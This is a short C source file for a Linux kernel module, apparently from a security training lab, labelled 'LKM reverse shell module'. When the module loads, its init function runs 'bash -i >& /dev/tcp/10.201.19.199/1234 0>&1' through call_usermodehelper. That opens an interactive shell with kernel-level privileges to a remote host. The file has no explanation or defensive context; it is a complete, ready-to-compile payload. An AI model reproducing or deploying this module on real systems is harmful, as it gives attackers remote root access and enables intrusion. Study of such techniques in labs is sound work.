#include <linux/module.h>
#include <linux/init.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

static char *argv[] = {
    "/bin/bash",
    "-c",
    "bash -i >& /dev/tcp/10.201.19.199/1234 0>&1",
    NULL
};

static char *envp[] = {
    "HOME=/",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    NULL
};

static int __init reverse_shell_init(void) {
    printk(KERN_INFO "[+] Reverse shell module loaded\n");
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "[-] Reverse shell module unloaded\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);